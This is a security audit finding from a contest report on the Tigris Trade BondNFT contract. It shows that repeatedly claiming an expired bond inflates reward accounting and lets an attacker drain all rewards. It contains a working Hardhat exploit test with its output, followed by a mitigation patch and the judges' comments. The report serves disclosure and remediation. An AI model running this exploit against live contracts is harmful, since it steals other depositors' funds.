[H-05] Malicious user can steal all assets in BondNFT
Submitted byhihen, also found byhansfriese,unforgiven,__141345__,rvierdiiev, andHollaDieWaldfee
Malicious user can drain all assets in BondNFT, and other users will lose their rewards.
Proof of Concept
When callingBondNFT.claim()for an expired bond, it will recalculateaccRewardsPerShare. This is because the reward after theexpireEpochdoes not belong to that expired bond and needs to be redistributed to all other bonds.
if(bond.expired) {uint_pendingDelta= (bond.shares*accRewardsPerShare[bond.asset][epoch[bond.asset]] /1e18-bondPaid[_id][bond.asset]) - (bond.shares*accRewardsPerShare[bond.asset][bond.expireEpoch-1] /1e18-bondPaid[_id][bond.asset]);if(totalShares[bond.asset] >0) {accRewardsPerShare[bond.asset][epoch[bond.asset]] +=_pendingDelta*1e18/totalShares[bond.asset];}}
In the current implementation ofBondNFT.claim(), it can be called repeatedly as long as the expired bond is not released.
According to the formula in the above code, we can find that although each subsequentclaim()of the expired bond will transfer 0 reward, theaccRewardsPerSharewill be updated cumulatively.
Thus, the pending rewards of all other users will increase every time the expired bond isclaim()ed.
A malicious user can exploit this vulnerability to steal all assets in BondNFT contract:
Create two bonds (B1, B2) with differentexpireEpochAt some time after B1 has expired (B2 has not), keep callingLock.claim(B1)to increase rewards of B2 continuously, until the pending rewards of B2 approaches the total amount of asset in the contract.CallLock.claim(B2)to claim all pending rewards of B2.
An example of such an attack:
diff--gita/test/09.Bonds.jsb/test/09.Bonds.jsindex16c3ff5..7c445c3100644---a/test/09.Bonds.js+++b/test/09.Bonds.js@@ -245,7+245,90@@describe("Bonds",function() {awaitlock.connect(user).release(2);expect(awaitbond.pending(1)).to.be.equals("999999999999999999725");// Negligable difference from 1000e18 due to solidity division});++it.only("Drain BondNFT rewards",asyncfunction() {+constgetState=async()=>{+constbalHacker=awaitstabletoken.balanceOf(hacker.address);+constbalLock=awaitstabletoken.balanceOf(lock.address);+constbalBond=awaitstabletoken.balanceOf(bond.address);+const[pending1,pending2,pending3] = [awaitbond.pending(1),awaitbond.pending(2),awaitbond.pending(3)];+return{hacker:balHacker,lock:balLock,bond:balBond,pending1,pending2,pending3};+      };+constparseEther= (v)=>ethers.utils.parseEther(v.toString());+constgwei=parseEther(1).div(1e9);++// prepare tokens+constTotalRewards=parseEther(8000);+awaitstabletoken.connect(owner).mintFor(owner.address,TotalRewards);+awaitstabletoken.connect(owner).mintFor(user.address,parseEther(1000));+consthacker=rndAddress;+awaitstabletoken.connect(owner).mintFor(hacker.address,parseEther(2000+700));+awaitstabletoken.connect(hacker).approve(Lock.address,parseEther(2000));++// bond1 - user+awaitlock.connect(user).lock(StableToken.address,parseEther(1000),100);+awaitbond.distribute(stabletoken.address,parseEther(3800));+expect(awaitbond.pending(1)).to.be.closeTo(parseEther(3800),gwei);+// Skip some time+awaitnetwork.provider.send("evm_increaseTime", [20*86400]);+awaitnetwork.provider.send("evm_mine");++// bond2 - hacker+awaitlock.connect(hacker).lock(StableToken.address,parseEther(1000),10);+// bond3 - hacker+awaitlock.connect(hacker).lock(StableToken.address,parseEther(1000),100);++awaitbond.distribute(stabletoken.address,parseEther(2100));++// Skip 10+ days, bond2 is expired+awaitnetwork.provider.send("evm_increaseTime", [13*86400]);+awaitnetwork.provider.send("evm_mine");+awaitbond.distribute(stabletoken.address,parseEther(2100));++// check balances before hack+letst=awaitgetState();+expect(st.bond).to.be.equals(TotalRewards);+expect(st.lock).to.be.equals(parseEther(3000));+expect(st.hacker).to.be.equals(parseEther(0+700));+expect(st.pending1).to.be.closeTo(parseEther(3800+1000+1000),gwei);+expect(st.pending2).to.be.closeTo(parseEther(100),gwei);+expect(st.pending3).to.be.closeTo(parseEther(1000+1000),gwei);++// first claim of expired bond2+awaitlock.connect(hacker).claim(2);+st=awaitgetState();+expect(st.bond).to.be.closeTo(TotalRewards.sub(parseEther(100)),gwei);+expect(st.hacker).to.be.closeTo(parseEther(100+700),gwei);+expect(st.pending1).to.be.gt(parseEther(3800+1000+1000));+expect(st.pending2).to.be.eq(parseEther(0));+expect(st.pending3).to.be.gt(parseEther(1000+1000));++// hack+constremainReward=st.bond;+letpending3=st.pending3;+leti=0;+for(;remainReward.gt(pending3);i++) {+// claim expired bond2 repeatedly+awaitlock.connect(hacker).claim(2);+// pending3 keeps increasing+pending3=awaitbond.pending(3);+      }+console.log(`claim count:${i}\nremain:${ethers.utils.formatEther(remainReward)}\npending3:${ethers.utils.formatEther(pending3)}\n`);++// send diff, then drain rewards in bond+awaitstabletoken.connect(hacker).transfer(bond.address,pending3.sub(remainReward));+awaitlock.connect(hacker).claim(3);+st=awaitgetState();+// !! bond is drained !!+expect(st.bond).to.be.eq(0);+// !! hacker gets all rewards !!+expect(st.hacker).to.be.eq(TotalRewards.add(parseEther(700)));+expect(st.pending1).to.be.gt(parseEther(3800+1000+1000));+expect(st.pending2).to.be.eq(0);+expect(st.pending3).to.be.eq(0);+    });});+describe("Withdrawing",function() {it("Only expired bonds can be withdrawn",asyncfunction() {awaitstabletoken.connect(owner).mintFor(owner.address,ethers.utils.parseEther("100"));
Output:
BondsRewardsclaim count: 41remain: 7900.000000000000000002pending3: 8055.7342616570405578✓ Drain BondNFT rewards1 passing (4s)
Tools Used
VS Code
Recommended Mitigation Steps
I recommend that an expired bond should be forced torelease(),claim()an expired bond should revert.
Sample code:
diff--gita/contracts/BondNFT.solb/contracts/BondNFT.solindex33a6e76..77e85ae100644---a/contracts/BondNFT.sol+++b/contracts/BondNFT.sol@@ -148,7+148,7@@contractBondNFTisERC721Enumerable,Ownable{amount=bond.amount;unchecked{totalShares[bond.asset] -=bond.shares;-            (uint256_claimAmount,) =claim(_id,bond.owner);+            (uint256_claimAmount,) =_claim(_id,bond.owner);amount+=_claimAmount;}asset=bond.asset;@@ -157,8+157,9@@contractBondNFTisERC721Enumerable,Ownable{_burn(_id);emitRelease(asset,lockAmount,_owner,_id);}+/**-     *@noticeClaim rewards from a bond+     *@noticeClaim rewards from an unexpired bond*@devShould only be called by a manager contract*@param_idID of the bond to claim rewards from*@param_claimeraddress claiming rewards@@ -168,6 +169,22 @@ contract BondNFT is ERC721Enumerable, Ownable {function claim(uint _id,address _claimer+    ) public onlyManager() returns(uint amount, address tigAsset) {+        Bond memory bond = idToBond(_id);+        require(!bond.expired, "expired");+        return _claim(_id, _claimer);+    }++    /**+     *@noticeClaim rewards from a releasing bond or an unexpired bond+     *@param_idID of the bond to claim rewards from+     *@param_claimeraddress claiming rewards+     *@returnamount amount of tigAsset claimed+     *@returntigAsset tigAsset token address+     */+function_claim(+uint_id,+address_claimer)publiconlyManager()returns(uintamount,addresstigAsset) {Bondmemorybond=idToBond(_id);require(_claimer==bond.owner,"!owner");
TriHaz (Tigris Trade) confirmed
Alex the Entreprenerd (judge) commented:
The warden has shown how, due to an inconsistent implementation of Bond State change, how they could repeatedly claim rewards for an expired bond, stealing value from all other depositors.Because the findings doesn’t just deny yield to others, but allows a single attacker to seize the majority of the yield rewards, leveraging a broken invariant, I agree with High Severity.
GainsGoblin (Tigris Trade) resolved:
Mitigation:https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419174442